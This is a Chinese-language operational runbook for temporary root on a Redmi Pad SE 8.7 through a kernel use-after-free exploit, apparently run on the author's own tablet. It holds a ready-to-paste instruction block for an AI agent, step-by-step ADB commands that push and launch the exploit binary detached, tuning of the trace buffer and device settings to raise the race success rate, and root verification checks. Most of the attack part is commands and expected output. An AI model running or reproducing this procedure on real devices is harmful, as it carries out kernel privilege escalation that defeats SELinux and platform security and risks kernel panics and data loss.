# 临时 ROOT 恢复手册

> **设备**：Redmi Pad SE 8.7（`flare` / `24075RP89G` / MT8786）
> **系统**：HyperOS `OS3.0.303.0.WHXMIXM` / Android 16
> **内核**：`6.6.118-android15-8-gc4127a25dcf3-ab15863337-4k`
> **漏洞**：CVE-2026-98260（posix-cpu-timers `de_thread()` exec UAF）
> **性质**：临时 root，**重启即消失**；**零分区写入**，BL 保持 `green`（锁着）

---

## 0. 给 AGENT 的话（可直接复制）

```
这台 Redmi Pad SE 8.7 需要临时 root。请严格按
D:\Projects\1.testing\xiaomi\临时ROOT-恢复手册.md 执行。

一句话版：
  cd D:\Projects\1.testing\xiaomi
  .\temp-root.ps1 -RebootRetry

成功率约 2/3 一次成功，失败必须重启（不要手动 kill 残留进程）。
如果连续失败 ≥3 次，先执行手册第 4 节的「环境清理」再重试。

绝对禁止：写分区、fastboot flash、kill 那个 parked holder、两实例并行。
```

---

## 1. ⚡ 最快路径

**双击桌面图标 `TEMP-ROOT`** —— 等价于下面的命令，已自带 `-RebootRetry`。

或者在 PowerShell 里：

```powershell
cd D:\Projects\1.testing\xiaomi
.\temp-root.ps1 -RebootRetry
```

正常输出（约 20~40 秒）：

```
── exploit --auto ──
  ·  preparing the machine
  ·    free memory : 105,940 kB -> 546,404 kB
  ·    trace buffer: 1410 kB -> 4099 kB

  attempt 1 / 4
    [+] stage fake_cred  burst hit=1 after 99ms
    [+] stage selinux    burst hit=1 after 236ms
    [+] stage fake_uid   burst hit=1 after 70ms
    PLANT_CRED_OK child=9144
    LATE_LOAD_RC=0
  ✅ root acquired on attempt 1

── verify ──
  ✅ kernelsu module · uid · caps · data access · write test   5/5

[exit code: 0]
```

**成功判定：`exit code: 0` 且五项验证全 ✅。**

---

## 2. 前提检查（4 条，全部必须满足）

```powershell
adb shell uname -r                            # 必须逐字符等于下面的串
adb shell id                                  # 必须包含 3012(readtracefs)
adb shell getenforce                          # 必须是 Enforcing
adb shell getprop ro.boot.verifiedbootstate   # 必须是 green
```

期望值：

```
6.6.118-android15-8-gc4127a25dcf3-ab15863337-4k
uid=2000(shell) ... 3012(readtracefs) ...
Enforcing
green
```

> `readtracefs` 是硬前提：整个漏洞靠**读内核 trace** 观察内存分配，没这个组权限寸步难行。

**内核串只要有一位不一致就立即停止** —— exploit 的 profile 按整串匹配。

---

## 3. 需要的文件（都已就位，无需下载）

| 文件 | 作用 | sha256 前 16 位 |
|---|---|---|
| `xiaomi\artifacts\build32\shark-k66118-32` | exploit 本体（32 候选 KASLR 扫描） | `ce10f0cf504d2bc4` |
| `xiaomi\artifacts\ksud-3.3.1` | 加载 KernelSU 内核模块 | `4f7d5fd65631915e` |
| `xiaomi\temp-root.ps1` | 主脚本 | — |
| `xiaomi\temp-root.bat` | 双击包装器 | — |

备选二进制（**不要用于命令行**，见第 8 节）：

| 文件 | 说明 |
|---|---|
| `artifacts\build32\shark-k66118-autodef` | 无参数默认走三段链的版本，仅供 App 内嵌实验 |

---

## 4. 🔴 环境清理（**最容易踩的坑**）

以下任何一项开着，都会**显著拉低命中率**，表现为：

```
[+] plant1 free_seen=1 burst hit=0 after ~3150ms
[-] plant1 burst missed; holding zombie
FAIL=fake-cred
```

**连续 3 次以上都是这个错误，几乎一定是环境被污染了。** 执行：

```powershell
adb shell "settings put secure enabled_accessibility_services null"
adb shell "settings put secure accessibility_enabled 0"
adb shell "settings put global adb_wifi_enabled 0"
adb shell "pkill -f shark_shell"
adb shell "am force-stop com.shark.kty"
adb shell "setprop persist.traced.enable 0"
adb reboot
```

各自为什么有害：

| 项 | 后果 |
|---|---|
| 辅助功能服务（Shark 自启动） | 持续回调，抢占分配 |
| 无线调试（`adb_wifi_enabled=1`、`:43945`） | 后台守护进程持续申请内存、写 trace |
| `shark_shell` | 常驻 Java 进程；**多个实例还会让 App 并发派发** |
| 系统追踪 `persist.traced.enable=1` | **直接污染 exploit 依赖的 trace buffer**（上游 issue #3） |

> **实测**：这四项开着时连续 4 次 `stage fake_cred` 全失败；清理后**第一次就成功**（25.9 秒）。

### 4.5 环境自检清单（跑之前对一遍）

```powershell
# 这几个必须是这些值
adb shell settings get secure accessibility_enabled               # 0
adb shell settings get secure enabled_accessibility_services      # null
adb shell settings get global adb_wifi_enabled                    # 0
adb shell getprop persist.traced.enable                           # 0
adb shell getprop debug.atrace.tags.enableflags                   # 0

# 这些进程不应该存在
adb shell "ps -A -o PID,NAME | grep -iE 'traced|perfetto|shark_shell'"

# trace 状态：tracing_on 必须 0，buffer 越大越好
adb shell cat /sys/kernel/tracing/tracing_on                      # 0
adb shell cat /sys/kernel/tracing/buffer_size_kb                  # 4099（脚本会调大）
adb shell "wc -l < /sys/kernel/tracing/trace"                     # 越小越好
```

**trace buffer 可以清空，而且 shell 权限就够**（这是实测确认的）：

```powershell
adb shell "echo 0 > /sys/kernel/tracing/trace"
```

`buffer_size_kb` 也能被 shell 写大（实测 `echo 4096 > …` 生效）。**脚本这两件事都会自动做。**

### 4.6 不影响 exploit、但值得知道的两件事

| 项 | 说明 |
|---|---|
| `/data/local/tmp` 占用 ~1.7 GB | 主要是历史项目留下的大文件（`ipogo261.apk`、`mcd.apk`、各种 `.bin` dump）。在 106 GB 的 `/data` 里只占 **1.7%**（还剩 77 GB），**不构成问题，可以不管**。和 exploit 竞态无关。 |
| KSU 模块 `rezygisk`、`pgs` | 只在 **root 加载之后**才生效（`ksud late-load` 之后），所以**不参与 exploit 的页回收竞态**。但 `rezygisk` 是 Zygisk 实现，注入所有应用进程，对日常稳定性和性能有影响；不需要的话可以在 KernelSU 管理器里停用。 |

---

## 5. 完整手动流程（想搞清每一步时用）

### 5.1 推送

```powershell
adb push D:\Projects\1.testing\xiaomi\artifacts\build32\shark-k66118-32 /data/local/tmp/shark66118
adb push D:\Projects\1.testing\xiaomi\artifacts\ksud-3.3.1              /data/local/tmp/ksud33
adb shell chmod 755 /data/local/tmp/shark66118 /data/local/tmp/ksud33
```

> `/data/local/tmp` **不会**被系统定期清理 —— 实测里 11-01 放进去的文件至今还在。但同一个路径可能被别的工具覆盖或替换，所以脚本每次按 SHA256 比对、必要时重推。

### 5.2 自检（零风险，不触发 UAF）

```powershell
adb shell /data/local/tmp/shark66118 probe
```

关键三行，缺一不可：

```
[calib] timers=512 low_adj=0x80000      ← timers 必须是 512
[cred] ... task_recs=1                   ← task_recs 必须是 1
PROBE_SLIDE=0x... aligned=0              ← aligned=0 是正常的
```

- `timers=0` → 二进制不对（用错版本了）
- `task_recs=0` → 同上
- `aligned=0` → **正常**，这台机器的 KASLR 位移含物理放置分量

### 5.3 开打（**必须 detached**）

```powershell
adb shell 'cd /data/local/tmp; rm -f /data/local/tmp/run.log; setsid env PYB110_KSUD=/data/local/tmp/ksud33 PYB110_MANAGER_PKG=me.weishu.kernelsu PYB110_KMI=android15-6.6 /data/local/tmp/shark66118 --auto > /data/local/tmp/run.log 2>&1 < /dev/null & echo LAUNCHED'
```

**三个细节都不能省，否则 adb 会永久卡住：**

| 写法 | 原因 |
|---|---|
| 用 `;` 而不是 `&&` | `&&` 链再 `&` 会把整个列表后台化，那个子 shell 攥着 PTY，**adb 永远等不到 EOF**（实测卡 20 秒） |
| `setsid` | 脱离终端会话 |
| `> log 2>&1 < /dev/null` | 三个描述符全重定向，否则一样攥着 PTY |

然后轮询：

```powershell
adb shell su -c id          # 每 3 秒一次，正常 10~30 秒出结果
adb shell cat /data/local/tmp/run.log   # 看进度
```

### 5.4 成功标志

```
[+] stage fake_cred  ... burst hit=1
[+] stage selinux    ... burst hit=1
[+] stage fake_uid   ... burst hit=1
[child] woke uid=0 euid=0
[+] child report stage=2 uid=0 euid=0 setuid(0)=0 errno=0 resuid=0/0/0
PLANT_CRED_OK child=<pid>
LATE_LOAD_RC=0
LATE_LOAD_SHELL_RC=0
```

### 5.5 五项验证

```powershell
adb shell grep kernelsu /proc/modules                 # kernelsu ... Live
adb shell su -c id                                     # uid=0(root) context=u:r:ksu:s0
adb shell su -c 'grep CapEff /proc/self/status'        # 000001ffffffffff
adb shell su -c 'ls /data/adb'                         # ksu | ksud | modules | ...
adb shell su -c 'echo ok > /data/adb/_t && cat /data/adb/_t && rm /data/adb/_t'   # ok
```

---

## 6. 失败排查表

| 现象 | 含义 | 处理 |
|---|---|---|
| `burst hit=0 after ~3100ms`，连续多次 | **环境被污染** | 第 4 节清理 + 重启 |
| `burst hit=0`，偶发一次 | 正常的 1/3 概率 | `-RebootRetry` 自动重启重试 |
| `FAIL=fake-cred` / `FAIL=selinux` / `FAIL=fake-uid` | 某阶段没撞上 | 同上，重启后重跑 |
| `timers=0` / `task_recs=0` | 二进制版本不对 | 换 `build32\shark-k66118-32` |
| `an exploit instance is still running (pid N)` | 上次留下 holder | **重启**，不要 kill |
| `device not found` | USB 掉线或正在重启 | 等 10 秒重试 |
| 已 root 但无 `su` | ksud 还在写 `/system/bin/su` | 等 2 秒重试 |
| `su: Text file busy` | 同上，瞬时 | 等 2 秒重试 |

### 概率参考

单次成功率约 **2/3**（三个阶段各约 88%，`0.88³ ≈ 0.68`）。

| 尝试次数 | 累计成功率 |
|---|---|
| 1 | 67% |
| 2 | 89% |
| 3 | 96% |
| 5 | 99.6% |

```powershell
.\temp-root.bat -Cycles 5      # 允许 5 轮（每轮失败自动重启）
```

---

## 7. ⛔ 硬规则（违反可能让内核 panic）

1. **绝对不要 `kill` 那个 parked holder 进程**（`pidof shark66118` 打出来的 PID）
   它攥着一块伪造的 cred 页；杀掉 → 页被释放 → 内核里还有 task 指向它 → **panic**。
   要清就重启。

2. **绝不并行跑两个 exploit 实例**
   实测会让平板自己重启。脚本已内置保护：检测到存活实例就先重启。

3. **绝不写分区 / 不 `fastboot flash` / 不碰 bootloader**
   这套方案设计上不写任何分区，`verifiedbootstate` 始终 `green`。

4. **失败后不要原地重跑**，必须重启（除非脚本明确说「进程已干净退出」）。

5. **不要用 Shark App 的「一键越狱」** —— 见第 8 节。

---

## 8. 已知不可用的路线（省点时间）

### ❌ Shark App 的一键越狱

- App 内嵌的 `libk66118.so` 是**单次 plant 模式**（无参数调用），只能改 uid、改不了 euid，**每次 4 秒失败**，日志为 `child did not reach euid 0`。
- 我改过一版让它无参数默认走三段链（`artifacts\build32\shark-k66118-autodef`，sha `87548e34…`），**命令行验证成功（12 秒）**，但**通过 App 运行会导致设备重启**（2/2 次）—— 推测 App 自身进程与 exploit 抢同一批页，写入打偏污染内核内存。
- 结论：**App 这条路走不通**，已把 App 恢复为旧版（sha `d27fc783…`）。

### ❌ 其他漏洞路线（项目早期已验证关闭）

| 路线 | 状态 |
|---|---|
| DirtyFrag（CVE-2026-43284） | 内核已回补 → `DEVICE NOT VULNERABLE` |
| GhostLock（CVE-2026-43499） | 内核已回补 → `kernel already fixed the vulnerability` |
| 软件进 BROM | HyperOS Recovery 抢占音量键冷启动；preloader DAA 拒绝未签名 DA；7 组 crash 矩阵全灭 |

### 永久 root 只有两条路（都要付出代价）

| 方式 | 代价 |
|---|---|
| 官方解锁名额 | 30 天账号 + 整点抢；**清空全部数据** |
| 硬件进 BROM（EDL 短接线 / 拆机短接测试点） | 拆机或短接，有变砖风险 |

---

## 9. 设备「炸了」怎么办

**先说结论：这套方案几乎炸不了。** 全程零分区写入，最坏情况是内核 panic 后自动重启。

| 现象 | 处理 |
|---|---|
| adb 无响应 | 长按电源键 **15 秒**强制重启 |
| 卡在开机 logo | 等 2 分钟；不行就 `音量下 + 电源` 进 Recovery 重启系统 |
| 重启后没有 root | **正常**，跑第 1 节 |
| 反复 panic 重启 | 进安全模式（开机时按住音量下）禁用可疑模块，然后重跑 |
| 系统提示文件系统损坏 | 硬 panic 导致的脏 FS；重启通常自愈，必要时进 Recovery 清 cache |
| 真的开不了机 | 只能用官方线刷包（`flare_global_images_OS3.0.303.0.WHXMIXM…tgz`，已在 `xiaomi\` 目录）—— **这也意味着数据全丢** |

---

## 10. 已验证数据（本机实测）

- **KASLR slide 每次启动都变**，但 `slide & 0x1fffff` 恒为 `0x80000`（跨 10+ 次启动验证）
- 因此 32 候选扫描在这台机器上余量充足
- 一次成功耗时：**12 ~ 40 秒**；含重启重试最坏约 3 分钟
- `panic_on_warn` 会被 exploit 设为 0（这是它降低崩溃概率的手段）
- `buffer_size_kb` 可被 shell 用户写大（1410 → 4099 KB），脚本已自动做

---

## 11. 撤销

```powershell
adb reboot
```

一条命令。root 消失、模块卸载、SELinux 恢复、内存改动清零，**磁盘上不残留任何东西**。
